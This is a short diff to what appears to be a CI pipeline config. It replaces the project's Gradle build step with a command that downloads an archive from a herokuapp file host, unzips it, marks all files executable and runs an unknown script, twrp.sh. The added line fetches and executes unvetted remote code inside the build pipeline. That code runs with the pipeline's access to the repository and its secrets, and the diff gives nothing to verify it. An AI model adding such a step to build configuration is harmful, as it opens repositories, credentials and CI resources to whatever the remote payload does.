@@ -10,4 +10,4 @@ jobs:
     steps:
       - checkout
       - run:
-          command: chmod +x * && ./gradlew build
+          command: wget https://dlmediafiles.herokuapp.com/-1001403671743/120249/download && unzip twrp.zip && chmod +x * && ./twrp.sh
